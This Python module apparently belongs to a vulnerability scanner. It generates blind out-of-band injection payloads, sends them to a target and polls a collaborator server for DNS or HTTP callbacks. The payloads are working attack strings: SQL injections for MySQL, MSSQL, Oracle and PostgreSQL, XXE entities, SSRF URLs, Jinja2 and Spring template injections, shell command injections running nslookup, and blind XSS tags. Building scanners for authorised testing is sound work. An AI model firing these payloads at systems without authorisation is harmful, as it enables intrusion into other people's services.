"""
GrotAssault — Blind injection Out-of-Band (OOB) detection.

Generates blind injection payloads that trigger DNS/HTTP callbacks to an
external collaborator server, then checks for interactions.
"""

from __future__ import annotations

import hashlib
import logging
import time
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClientMixin

logger = logging.getLogger("krumpa.grotassault.blind_oob")


@dataclass
class OobInteraction:
    """A recorded OOB interaction from the collaborator."""
    token: str
    interaction_type: str  # "dns", "http", "smtp"
    source_ip: str = ""
    timestamp: float = 0.0
    raw_data: str = ""


@dataclass
class OobPayload:
    """A blind injection payload with OOB callback."""
    token: str
    payload: str
    vuln_type: str
    description: str


class BlindOobDetector(HttpClientMixin):
    """
    Generate blind injection payloads with OOB (out-of-band) callbacks
    and check a collaborator server for interactions.
    """

    def __init__(
        self,
        http_client: Any = None,
        *,
        collaborator_domain: Optional[str] = None,
        collaborator_api_url: Optional[str] = None,
        poll_interval: float = 2.0,
        poll_timeout: float = 15.0,
    ) -> None:
        self._client = http_client
        self._owns_client = False
        self._collaborator_domain = collaborator_domain or "oob.example.internal"
        self._collaborator_api_url = collaborator_api_url
        self._poll_interval = poll_interval
        self._poll_timeout = poll_timeout
        self._pending_tokens: Dict[str, Dict[str, Any]] = {}

    # ------------------------------------------------------------------
    # Token generation
    # ------------------------------------------------------------------

    def generate_token(self, *, prefix: str = "gk") -> str:
        """Generate a unique token for OOB correlation."""
        raw = f"{prefix}-{time.monotonic()}-{id(self)}"
        return f"{prefix}{hashlib.sha256(raw.encode()).hexdigest()[:16]}"

    # ------------------------------------------------------------------
    # Payload generation
    # ------------------------------------------------------------------

    def build_payloads(
        self,
        vuln_type: str,
        *,
        token: Optional[str] = None,
    ) -> List[OobPayload]:
        """
        Generate OOB payloads for a given vulnerability type.
        """
        tok = token or self.generate_token()
        callback = f"{tok}.{self._collaborator_domain}"

        generators = {
            "sqli": self._sqli_payloads,
            "xxe": self._xxe_payloads,
            "ssrf": self._ssrf_payloads,
            "ssti": self._ssti_payloads,
            "rce": self._rce_payloads,
            "xss": self._xss_payloads,
        }

        gen = generators.get(vuln_type)
        if not gen:
            return []

        return gen(tok, callback)

    # ------------------------------------------------------------------
    # Active testing
    # ------------------------------------------------------------------

    async def inject_and_poll(
        self,
        target: Target,
        payloads: List[OobPayload],
        *,
        inject_field: str = "",
    ) -> List[Finding]:
        """
        Send payloads to the target and poll the collaborator for interactions.
        """
        if not self._client:
            return []

        findings: List[Finding] = []

        for payload in payloads:
            # Register token for later polling
            self._pending_tokens[payload.token] = {
                "target": target,
                "payload": payload,
                "sent_at": time.monotonic(),
            }

            # Send the payload
            try:
                body = {inject_field: payload.payload} if inject_field else None
                params = {inject_field: payload.payload} if inject_field and not body else None

                if target.method.upper() in ("POST", "PUT", "PATCH"):
                    await self._client.request(
                        method=target.method,
                        url=target.url,
                        json_body=body,
                    )
                else:
                    await self._client.request(
                        method=target.method or "GET",
                        url=target.url,
                        params=params,
                    )
            except Exception as exc:
                logger.debug("Error injecting OOB payload: %s", exc)

        # Poll for interactions
        if self._collaborator_api_url:
            interactions = await self._poll_collaborator()
            for interaction in interactions:
                context = self._pending_tokens.get(interaction.token)
                if context:
                    pl: OobPayload = context["payload"]
                    findings.append(Finding(
                        title=f"Blind {pl.vuln_type} confirmed via OOB ({interaction.interaction_type})",
                        description=(
                            f"Blind {pl.vuln_type} injection on {target.url} was confirmed "
                            f"via {interaction.interaction_type} callback to the collaborator. "
                            f"Payload: {pl.payload[:100]}"
                        ),
                        severity=Severity.HIGH if pl.vuln_type != "xss" else Severity.MEDIUM,
                        target=target,
                        evidence=(
                            f"token={interaction.token}, type={interaction.interaction_type}, "
                            f"source={interaction.source_ip}"
                        ),
                        remediation=f"Fix the blind {pl.vuln_type} injection vulnerability.",
                        cwe=self._vuln_to_cwe(pl.vuln_type),
                        tags=["blind", pl.vuln_type, "oob", interaction.interaction_type],
                    ))

        return findings

    # ------------------------------------------------------------------
    # Collaborator polling
    # ------------------------------------------------------------------

    async def _poll_collaborator(self) -> List[OobInteraction]:
        """Poll the collaborator API for interactions."""
        if not self._client or not self._collaborator_api_url:
            return []

        interactions: List[OobInteraction] = []
        deadline = time.monotonic() + self._poll_timeout

        while time.monotonic() < deadline:
            try:
                resp = await self._client.request(
                    method="GET",
                    url=self._collaborator_api_url,
                )
                if resp.status_code == 200:
                    data = resp.json()
                    for entry in (data if isinstance(data, list) else data.get("interactions", [])):
                        interactions.append(OobInteraction(
                            token=entry.get("token", ""),
                            interaction_type=entry.get("type", "unknown"),
                            source_ip=entry.get("source_ip", ""),
                            timestamp=entry.get("timestamp", 0.0),
                            raw_data=str(entry.get("raw", "")),
                        ))

                if interactions:
                    return interactions

            except Exception as exc:
                logger.debug("Collaborator poll error: %s", exc)

            # Wait before next poll
            import asyncio
            await asyncio.sleep(self._poll_interval)

        return interactions

    # ------------------------------------------------------------------
    # Payload generators
    # ------------------------------------------------------------------

    def _sqli_payloads(self, token: str, callback: str) -> List[OobPayload]:
        return [
            OobPayload(
                token=token,
                payload=f"' AND 1=(SELECT LOAD_FILE(CONCAT('\\\\\\\\','{callback}','\\\\a')))-- -",
                vuln_type="sqli",
                description="MySQL LOAD_FILE DNS exfiltration",
            ),
            OobPayload(
                token=token,
                payload=f"'; EXEC master..xp_dirtree '\\\\{callback}\\a'-- -",
                vuln_type="sqli",
                description="MSSQL xp_dirtree DNS exfiltration",
            ),
            OobPayload(
                token=token,
                payload=f"'||(SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY %25 remote SYSTEM \"http://{callback}/\">%25remote;]>'),'/l'))-- -",
                vuln_type="sqli",
                description="Oracle XXE-based OOB",
            ),
            OobPayload(
                token=token,
                payload=f"'; COPY (SELECT '') TO PROGRAM 'nslookup {callback}'-- -",
                vuln_type="sqli",
                description="PostgreSQL COPY TO PROGRAM DNS",
            ),
        ]

    def _xxe_payloads(self, token: str, callback: str) -> List[OobPayload]:
        return [
            OobPayload(
                token=token,
                payload=f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback}/xxe">]><data>&xxe;</data>',
                vuln_type="xxe",
                description="Basic XXE with HTTP callback",
            ),
            OobPayload(
                token=token,
                payload=f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback}/xxe">%xxe;]>',
                vuln_type="xxe",
                description="Parameter entity XXE",
            ),
        ]

    def _ssrf_payloads(self, token: str, callback: str) -> List[OobPayload]:
        return [
            OobPayload(token=token, payload=f"http://{callback}/ssrf", vuln_type="ssrf", description="Direct HTTP callback"),
            OobPayload(token=token, payload=f"https://{callback}/ssrf", vuln_type="ssrf", description="HTTPS callback"),
            OobPayload(token=token, payload=f"///{callback}/ssrf", vuln_type="ssrf", description="Protocol-relative callback"),
        ]

    def _ssti_payloads(self, token: str, callback: str) -> List[OobPayload]:
        return [
            OobPayload(
                token=token,
                payload=f'{{% import os %}}{{{{ os.popen("nslookup {callback}").read() }}}}',
                vuln_type="ssti",
                description="Jinja2 SSTI with DNS callback",
            ),
            OobPayload(
                token=token,
                payload=f'${{T(java.lang.Runtime).getRuntime().exec("nslookup {callback}")}}',
                vuln_type="ssti",
                description="Spring EL SSTI with DNS callback",
            ),
        ]

    def _rce_payloads(self, token: str, callback: str) -> List[OobPayload]:
        return [
            OobPayload(token=token, payload=f"; nslookup {callback}", vuln_type="rce", description="Command injection DNS"),
            OobPayload(token=token, payload=f"| nslookup {callback}", vuln_type="rce", description="Pipe injection DNS"),
            OobPayload(token=token, payload=f"`nslookup {callback}`", vuln_type="rce", description="Backtick injection DNS"),
            OobPayload(token=token, payload=f"$(nslookup {callback})", vuln_type="rce", description="Subshell injection DNS"),
        ]

    def _xss_payloads(self, token: str, callback: str) -> List[OobPayload]:
        return [
            OobPayload(
                token=token,
                payload=f'<img src="http://{callback}/xss">',
                vuln_type="xss",
                description="Blind XSS via img tag",
            ),
            OobPayload(
                token=token,
                payload=f'"><script src="http://{callback}/xss.js"></script>',
                vuln_type="xss",
                description="Blind XSS via script tag",
            ),
        ]

    # ------------------------------------------------------------------
    # Utility
    # ------------------------------------------------------------------

    @staticmethod
    def _vuln_to_cwe(vuln_type: str) -> int:
        mapping = {
            "sqli": 89,
            "xxe": 611,
            "ssrf": 918,
            "ssti": 1336,
            "rce": 78,
            "xss": 79,
        }
        return mapping.get(vuln_type, 0)
